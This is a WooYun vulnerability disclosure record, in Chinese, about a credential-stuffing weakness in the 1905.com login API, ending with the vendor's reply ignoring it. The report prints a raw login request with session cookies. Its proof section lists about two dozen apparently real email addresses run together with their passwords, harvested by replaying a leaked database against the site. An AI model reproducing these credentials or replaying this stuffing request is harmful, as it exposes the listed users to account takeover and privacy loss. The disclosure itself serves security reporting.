{"id": 32001, "wybug_id": "wooyun-2015-0112517", "wybug_title": "M1905某接口撞库泄露用户登录凭据(有批量账号证明)", "wybug_corp": "M1905.COM", "wybug_author": "路人甲", "wybug_date": "2015-05-07 09:42", "wybug_open_date": "2015-05-10 22:25", "wybug_type": "设计缺陷/逻辑错误", "wybug_level": "高", "wybug_rank_0": "18", "wybug_status": "漏洞已经通知厂商但是厂商忽略漏洞", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["撞库"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-05-07：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-05-10：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： 撞库扫号攻击已经是Top 10 Security Risks for 2014之一.撞库以大量的用户数据为基础，利用用户相同的注册习惯（相同的用户名和密码），尝试登陆其它的网站。2011年，互联网泄密事件引爆了整个信息安全界，导致传统的用户+密码认证的方式已无法满足现有安全需求。泄露数据包括：天涯：31,758,468条，CSDN：6,428,559条，微博：4,442,915条，人人网：4,445,047条，猫扑：2,644,726条，178：9,072,819条，嘟嘟牛：13,891,418条，7K7K：18,282,404条，共1.2亿条。不管你的网站密码保护的多好，但是面对已经泄露的账号密码，撞库扫号防御还是一个相当重要的环节。 详细说明：      主站登录接口没有防御撞库。对登录接口的调用没有进行限制。经过测试发现，使用某泄露数据库可以碰撞获得大量有效的登录账号。 对请求频率有一定的限制，但是没有加黑名单的策略。依旧可以利用。  登录接口抓包如下：\nGET /v2/api/?m=user&a=login&callback=jQuery110205520349647849798_1430913181146&username=appollp@netease%2ecom&password=apple&_=1430913181152 HTTP/1.1Host: passport.1905.comProxy-Connection: keep-aliveAccept: text/javascript, application/javascript, application/ecmascript, application/x-ecmascript, */*; q=0.01X-Requested-With: XMLHttpRequestUser-Agent: Opera/9.80 (Windows NT 6.0) Presto/2.12.388 Version/12.14Referer: http://passport.1905.com/v2/?m=user&a=login&callback_url=http%3A%2F%2Fwww.1905.com%2FAccept-Encoding: gzip, deflate, sdchAccept-Language: zh-CN,zh;q=0.8,en;q=0.6Cookie: uacd=b8ec4e11b535fc3269cfcedffa2901ff030; afp_2015012901=yes; __uv_=8475197465; WOlTvIlgRpuvid_=1953; SpMLdaPxuv=m1101551615; PHPSESSID=pmtkrmrpenh4ps2jqpaqt7s5j2; _gat=1; pvid=1430913181149; WOlTvIlgRptime_=1430913181149; Hm_lvt_49411f7bde52035653f2e2b70a0bb6a5=1430913181; Hm_lpvt_49411f7bde52035653f2e2b70a0bb6a5=1430913181; Hm_lvt_5a9573957327e40b58294447cd1d8ad2=1430913181; Hm_lpvt_5a9573957327e40b58294447cd1d8ad2=1430913181; _ga=GA1.2.1470404625.1430913181; vjuids=3004af2f4.14d29126825.0.c478aa7; tmc=1.68774865.13406477.1430913182980.1430913182980.1430913182980; tma=68774865.13406477.1430913182980.1430913182980.1430913182980.1; tmd=1.68774865.13406477.1430913182980.; vjlast=1430913182.1430913182.30; bfd_session_id=bfd_s=68774865.82763611.1430913182977&bfd_g=9de2782bcb754fd700002a7808332ca15549aa8aRA-Ver: 2.10.0RA-Sid: 7B9DD012-20150303-080129-82895f-fb68a9AlexaToolbar-ALX_NS_PH: AlexaToolbar/alxg-3.3Connection: close\n   漏洞证明：  经过测试发现，使用某泄露数据库可以碰撞获得大量有效的登录账号.\nhellowyfandpy@163.com\tyan371109wh5355@gmail.com\twanghao110jinsong1111@163.com\t19841022yongguang1000@163.com\t80254371023zhangchenghao0522@163.com\t20050522firstlove.oomm@yahoo.com.cn\tfirstlove123yanzhongsheng@126.com\t198552200919685771@qq.com\t4206827Hwanjun0_0@163.com\t1310532512683cres7777777@163.com\tcres0528lacg1973@163.com\t1973091574small@sina.com\t741112ting000@sina.com\tsting000hfab-001@163.com\t341315926liucao136419@163.com\t648847188icehhp@126.com\t520520golwei1@yahoo.com.cn\t56297245netufo@netufo.com\twobushuochuluhao@tom.com\tchu.1986cwxcui@163.com\tcui9920311sherry_jingjing@163.com\txujingjing811208zhangni8524@sina.com\t19841012dechg@163.com\tallofyou\n\n\n\n\n   修复方案：  撞库防御参考资料:http://stayliv3.github.io/2015/04/15/%E6%92%9E%E5%BA%93%E6%94%BB%E5%87%BB%E9%98%B2%E5%BE%A1%E6%96%B9%E6%A1%88/   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2015-05-10 22:25 厂商回复： 技术只能限制同ip请求数 避免刷，无法让用户进行有效避免。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}